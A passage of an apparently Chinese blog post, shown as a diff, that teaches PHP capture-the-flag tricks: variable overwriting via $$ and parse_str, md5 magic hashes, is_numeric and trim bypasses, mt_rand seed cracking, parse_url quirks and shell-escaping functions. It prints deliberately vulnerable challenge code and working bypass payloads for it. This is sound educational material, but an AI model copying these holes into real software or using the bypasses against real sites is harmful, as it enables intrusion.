+if(isset($gift)){
+	$content = trim(file_get_contents($flag));
+		if($gift == $content){
+			echo $trueflag;
+}
+	else{
+		echo 'Oh..';
+	}
+}
+?&gt;</code></pre>
+<p>构造gift=&amp;flag=，得到flag。</p>
+<p><strong>$$</strong></p>
+<p>遍历初始化变量，由于php中可以使用$$声明变量，因此当在遍历数组时可能会覆盖原来的值。</p>
+<pre class="wp-block-code"><code>&lt;?php
+highlight_file(__FIlE__);
+$a = "helloworld";
+echo "$a";
+echo "&lt;br&gt;";
+foreach ($_GET as $key =&gt; $value) {
+	$$key=$value;
+}
+echo "$a";
+?&gt;</code></pre>
+<p>如果构造a=123，就会输出helloworld，123。</p>
+<pre class="wp-block-code"><code>&lt;?php
+highlight_file(__FIlE__);
+include "flag.php"
+$_403 = "Access Denied";
+$_200 = "Welcome Admin";
+
+if ($_SERVER&#91;"REQUEST_METHOD"] != "POST")
+	{die("BugsBunnyCTF is here :p...");}
+
+if ( !isset($_POST&#91;"flag"]))
+	{die($_403);}
+
+foreach ($_GET as $key =&gt; $value) {
+	$$key=$$value;
+}
+
+foreach ($_POST as $key =&gt; $value) {
+	$$key=$value;
+}
+
+if ( $_POST&#91;"flag"]!==$flag)
+	{die($_403);}
+
+echo "This is your flag :".$flag."\n";
+die($_200);
+?&gt;</code></pre>
+<p>这里用POST随便传一个flag=111，GET传_200=flag，通过die($_200)得到flag。</p>
+<p><strong>parse_str()</strong></p>
+<p><code>parse_str</code>， 将字符串解析成多个变量。</p>
+<p>范例</p>
+<pre class="wp-block-code"><code>
+&lt;?php
+$str = "first=value&arr&#91;]=foo+bar&arr&#91;]=baz";
+
+// 推荐用法
+parse_str($str, $output);
+echo $output&#91;'first'];  // value
+echo $output&#91;'arr']&#91;0]; // foo bar
+echo $output&#91;'arr']&#91;1]; // baz
+
+// 不建议这么用
+parse_str($str);
+echo $first;  // value
+echo $arr&#91;0]; // foo bar
+echo $arr&#91;1]; // baz
+?&gt;</code></pre>
+<pre class="wp-block-code"><code>&lt;?php
+include "flag.php"
+if (empty($_GET&#91;'id']))
+	{
+		show_source(__FILE__);
+		die();
+	}
+	else
+	{
+		include ('flag.php');
+		$a = 'www.OPENCT.com';
+		$id = $_GET&#91;'id'];
+		@parse_str($id);
+		if ($a&#91;0] != 'QNKCDZO' && md5($a&#91;0]) == md5('QNKCDZO'))
+		{
+			echo $flag;
+		}
+		else
+		{
+			exit('其实很简单其实并不难！');
+		}
+	}
+?&gt;</code></pre>
+<p>构造id=a[0]=s878926199a，得到flag。</p>
+<p>由于 PHP 的变量名不能带「点」和「空格」，所以它们会被转化成下划线。</p>
+<h2 id="0x03-空白符问题">0x03 空白符问题</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$info</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$req</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$flag</span><span class="o">=</span><span class="s2">&#34;flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">ini_set</span><span class="p">(</span><span class="s2">&#34;display_error&#34;</span><span class="p">,</span> <span class="k">false</span><span class="p">);</span> <span class="c1">//为一个配置选项设置值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> <span class="c1">//关闭所有PHP错误报告
+</span></span></span><span class="line"><span class="cl"><span class="c1"># 条件一，要设置number参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;number&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">   <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;hint:26966dc52e85af40f59b4fe73d8c323a.txt&#34;</span><span class="p">);</span> <span class="c1">//HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">   <span class="k">die</span><span class="p">(</span><span class="s2">&#34;have a fun!!&#34;</span><span class="p">);</span> <span class="c1">//die — 等同于 exit()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">([</span><span class="nv">$_GET</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$global_var</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//foreach 语法结构提供了遍历数组的简单方式 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">foreach</span><span class="p">(</span><span class="nv">$global_var</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="nv">$value</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>  <span class="c1">//trim — 去除字符串首尾处的空白字符（或者其他字符）
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">is_string</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$req</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addslashes</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span> <span class="c1">// is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">is_palindrome_number</span><span class="p">(</span><span class="nv">$number</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$number</span> <span class="o">=</span> <span class="nx">strval</span><span class="p">(</span><span class="nv">$number</span><span class="p">);</span> <span class="c1">//strval — 获取变量的字符串值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="nv">$j</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$number</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">//strlen — 获取字符串长度
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">while</span><span class="p">(</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$j</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$number</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$number</span><span class="p">[</span><span class="nv">$j</span><span class="p">])</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="k">false</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">        <span class="nv">$i</span><span class="o">++</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">        <span class="nv">$j</span><span class="o">--</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="k">true</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 条件二 number的值不能是数字
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;number&#39;</span><span class="p">]))</span> <span class="c1">//is_numeric — 检测变量是否为数字或数字字符串 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="nv">$info</span><span class="o">=</span><span class="s2">&#34;sorry, you cann&#39;t input a number!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 条件三 trim处理过的number要等于取整之后的值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">elseif</span><span class="p">(</span><span class="nv">$req</span><span class="p">[</span><span class="s1">&#39;number&#39;</span><span class="p">]</span><span class="o">!=</span><span class="nx">strval</span><span class="p">(</span><span class="nx">intval</span><span class="p">(</span><span class="nv">$req</span><span class="p">[</span><span class="s1">&#39;number&#39;</span><span class="p">])))</span> <span class="c1">//intval — 获取变量的整数值
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     <span class="nv">$info</span> <span class="o">=</span> <span class="s2">&#34;number must be equal to it&#39;s integer!! &#34;</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 条件四 trim处理过的number经过反转之后要等于其本身
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     <span class="nv">$value1</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$req</span><span class="p">[</span><span class="s2">&#34;number&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">     <span class="nv">$value2</span> <span class="o">=</span> <span class="nx">intval</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nv">$req</span><span class="p">[</span><span class="s2">&#34;number&#34;</span><span class="p">]));</span>  
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">     <span class="k">if</span><span class="p">(</span><span class="nv">$value1</span><span class="o">!=</span><span class="nv">$value2</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">          <span class="nv">$info</span><span class="o">=</span><span class="s2">&#34;no, this is not a palindrome number!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>
+</span></span><span class="line"><span class="cl">     <span class="k">else</span>
+</span></span><span class="line"><span class="cl">     <span class="p">{</span>
+</span></span><span class="line"><span class="cl">     
+</span></span><span class="line"><span class="cl">          <span class="k">if</span><span class="p">(</span><span class="nx">is_palindrome_number</span><span class="p">(</span><span class="nv">$req</span><span class="p">[</span><span class="s2">&#34;number&#34;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">              <span class="nv">$info</span> <span class="o">=</span> <span class="s2">&#34;nice! </span><span class="si">{</span><span class="nv">$value1</span><span class="si">}</span><span class="s2"> is a palindrome number!&#34;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="k">else</span>
+</span></span><span class="line"><span class="cl">          <span class="p">{</span>
+</span></span><span class="line"><span class="cl">             <span class="nv">$info</span><span class="o">=</span><span class="nv">$flag</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">     <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$info</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>intval()成功时返回var 的integer 值，失败时返回0。空的array 返回0，非空的array 返回1。</p>
+<p>最大的值取决于操作系统。32 位系统最大带符号的integer 范围是-2147483648 到2147483647。64 位系统上，最大带符号的integer 值是9223372036854775807。<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-296.png" alt="" class="wp-image-3400" width="494" height="617" /> </figure></p>
+<p>浮点数的精度<figure class="wp-block-image size-full is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-297.png" alt="" class="wp-image-3402" width="295" height="529" /> </figure></p>
+<p>is_numeric<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="1174" height="623" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-298.png" alt="" class="wp-image-3404" /> </figure></p>
+<p>如果不指定第二个参数，<strong>trim()</strong> 将去除这些字符：</p>
+<pre class="wp-block-code"><code>    " " (ASCII 32 (0x20))，普通空格符。
+    "\t" (ASCII 9 (0x09))，制表符。
+    "\n" (ASCII 10 (0x0A))，换行符。
+    "\r" (ASCII 13 (0x0D))，回车符。
+    "\0" (ASCII 0 (0x00))，空字节符。
+    "\x0B" (ASCII 11 (0x0B))，垂直制表符。</code></pre><figure class="wp-block-image size-full is-resized">
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-299.png" alt="" class="wp-image-3406" width="397" height="87" /> </figure></p>
+<p>解法参考<a rel="noreferrer noopener" href="https://www.cnblogs.com/mkdd/p/13023618.html" target="_blank" rel="nofollow" ><a href="https://www.cnblogs.com/mkdd/p/13023618.html" target="_blank" rel="noopener noreffer ">https://www.cnblogs.com/mkdd/p/13023618.html</a></a>。</p>
+<h2 id="0x04-伪随机数问题">0x04 伪随机数问题</h2>
+<p><code>mt_srand</code> ，播下一个更好的随机数发生器种子。如果我们自己指定范围，如果过小则很容易被爆破出来的，因此大多实际应用中都是不指定范围，mt_rand()函数默认范围是0到mt_getrandmax()之间的伪随机数。</p>
+<p>同时相同的种子生成的随机数是相同的，所以可以通过逆推mt_rand的种子来获得同页面的另一个rand的值。</p>
+<p>工具：<a href="https://www.openwall.com/php_mt_seed/" data-type="URL" data-id="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noreferrer noopener" rel="nofollow" >php_mt_seed</a><figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" width="170" height="52" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-300.png" alt="" class="wp-image-3411" /></figure></p>
+<h2 id="0x05-其他函数问题">0x05 其他函数问题</h2>
+<p><strong>运算符</strong></p>
+<pre class="wp-block-code"><code>&lt;?php
+include "flag.php"
+$a = 'test';
+$b = 'test2';
+$a = $_GET&#91;'a'];
+$b = $_GET&#91;'b'];
+$c = is_numeric($a) and is_numeric($b);
+if ($c){
+	if (is_numeric($a)){
+		if (is_numeric($b)){
+			echo "is_numeric(b)";
+		}else{
+			echo $flag;
+		}
+	}else{
+		echo 'is_numeric(a) error';
+	}
+}
+else{
+	print "is_numeric(a) and is_numeric(b) error!";
+}
+?></code></pre><figure class="wp-block-image size-full">
+<p><img loading="lazy" width="743" height="633" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-311.png" alt="" class="wp-image-3427" /> </figure></p>
+<p>所以<code>$c = is_numeric($a) and is_numeric($b);</code>实际上是<code>&lt;span class=&quot;has-inline-color has-vivid-red-color&quot;&gt;(&lt;/span&gt;$c = is_numeric($a)&lt;span class=&quot;has-inline-color has-vivid-red-color&quot;&gt;)&lt;/span&gt; and is_numeric($b);</code></p>
+<p><strong>parse_url</strong></p>
+<p><code>parse_url</code> ，解析 URL，返回其组成部分。本函数不是用来验证给定 URL 的合法性的，只是将其分解为下面列出的部分。不完整的 URL 也被接受，parse_url() 会尝试尽量正确地将其解析。parse_url() 是专门用来解析 URL 而不是 URI 的。不过为遵从 PHP 向后兼容的需要有个例外，对 file:// 协议允许三个斜线（file:///&hellip;）。其它任何协议都不能这样。</p>
+<p>范例</p>
+<pre class="wp-block-code"><code>
+&lt;?php
+$url = 'http://username:password@hostname/path?arg=value#anchor';
+
+print_r(parse_url($url));
+
+echo parse_url($url, PHP_URL_PATH);
+?></code></pre>
+<p>输出结果</p>
+<pre class="wp-block-code"><code>Array
+(
+    &#91;scheme] => http
+    &#91;host] => hostname
+    &#91;user] => username
+    &#91;pass] => password
+    &#91;path] => /path
+    &#91;query] => arg=value
+    &#91;fragment] => anchor
+)
+/path</code></pre>
+<p>如果指定了component 参数，parse_url() 返回一个string （或在指定为PHP_URL_PORT 时返回一个integer）而不是array。如果URL 中指定的组成部分不存在，将会返回NULL。http:///会被返回false。</p>
+<pre class="wp-block-code"><code>&lt;?php
+    include "config.php";
+    $number1 = rand(1,100000000000000);
+    $number2 = rand(1,100000000000);
+    $number3 = rand(1,100000000);
+    $url = urldecode($SERVER&#91;'REQUEST_URI']);
+    $url = parse_url($url, PHP_URL_QUERY);
+    if (preg_match("/_/i", $url))
+    {
+        die("...");
+    }
+    if (preg_match("/0/i", $url))
+    {
+        die("...");
+    }
+    if (preg_match("/\w+/i", $url))
+    {
+        die("...");
+    }
+    if(isset($GET&#91;'_']) && !empty($GET&#91;'_']))
+    {
+        $control = $GET&#91;'_'];
+        if(!in_array($control, array(0,$number1)))
+        {
+            die("fail1");
+        }
+        if(!in_array($control, array(0,$number2)))
+        {
+            die("fail2");
+        }
+        if(!in_array($control, array(0,$number3)))
+        {
+            die("fail3");
+        }
+        echo $flag;
+    }
+    show_source(__FILE__);
+    ?></code></pre>
+<p>可以构造<code>///php/prase_url/ prase_url.php?_=a</code>或者 <code>///php/prase_url/ prase_url.php?.=a</code></p>
+<p><strong>escapeshellarg 和 escapeshellcmd</strong></p>
+<p><code>escapeshellarg</code> , 把字符串转码为可以在 shell 命令里使用的参数。escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。</p>
+<p><code>escapeshellcmd</code>，shell 元字符转义。escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p>
+<pre class="wp-block-code"><code>&lt;?php 
+print_r(escapeshellcmd("who 'ami"));
+print_r(escapeshellarg("who 'ami"));
+print_r(escapeshellcmd("who''ami"));
+print_r(escapeshellarg("who''ami"));
+?></code></pre>
+<p>对应的结果如下：</p>
+<pre class="wp-block-code"><code>who \'ami
+'who '\''ami'
+who''ami
+'who'\'''\''ami'</code></pre>
+<p>主要区别在于，对于单个单引号, escapeshellarg 函数转义后,会在字符串开始和结尾各加一个单引号，还会在被转义的单引号的左右各加一个单引号,但 escapeshellcmd 函数是直接加一个转义符，对于成对的单引号, escapeshellcmd 函数默认不转义,但 escapeshellarg 函数转义。</p>
+<p>例题如下，分析参考<a rel="noreferrer noopener" href="https://blog.csdn.net/weixin_43999372/article/details/86631794" target="_blank" rel="nofollow" ><a href="https://blog.csdn.net/weixin_43999372/article/details/86631794" target="_blank" rel="noopener noreffer ">https://blog.csdn.net/weixin_43999372/article/details/86631794</a></a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">waf</span><span class="p">(</span><span class="nv">$a</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$a</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/flag/i&#39;</span><span class="p">,</span><span class="nv">$key</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;are you a hacker&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*循环获取字符串 GET、POST、COOKIE ，并依次赋值给变量 $__R 。先判断 $$__R 变量是否存在数据，如果存在，则继续判断超全局数组 GET、POST、COOKIE 中是否存在键值相等的，如果存在，则删除该变量。GET提交flag=123，接着通过POST请求提交 _GET[flag]=123，当开始遍历 $_POST 超全局数组的时候，$_k=_GET $__v=Array ( [flag] =&gt; 123 ) 所以__k 就是 $_GET,即GET提交的值Array ( [flag] =&gt; 123 )此时__k == $__v 成立，变量 $_GET就被删除。*/</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;_POST&#39;</span><span class="p">,</span> <span class="s1">&#39;_GET&#39;</span><span class="p">,</span> <span class="s1">&#39;_COOKIE&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$__R</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$$__R</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span><span class="p">(</span><span class="nv">$$__R</span> <span class="k">as</span> <span class="nv">$__k</span> <span class="o">=&gt;</span> <span class="nv">$__v</span><span class="p">)</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$$__k</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$$__k</span> <span class="o">==</span> <span class="nv">$__v</span><span class="p">)</span> <span class="nx">unset</span><span class="p">(</span><span class="nv">$$__k</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">)</span> <span class="p">{</span> <span class="nx">waf</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span> <span class="p">{</span> <span class="nx">waf</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">);</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">)</span> <span class="p">{</span> <span class="nx">waf</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">);}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cm">/*extract把传递的_GET注册为$_GET,GET中传递的就有我们需要的参数*/</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">)</span> <span class="nx">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">,</span> <span class="nx">EXTR_SKIP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">)</span> <span class="nx">extract</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">,</span> <span class="nx">EXTR_SKIP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hongri&#39;</span><span class="p">]){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="p">)</span> <span class="o">==</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;hongri&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$urlInfo</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
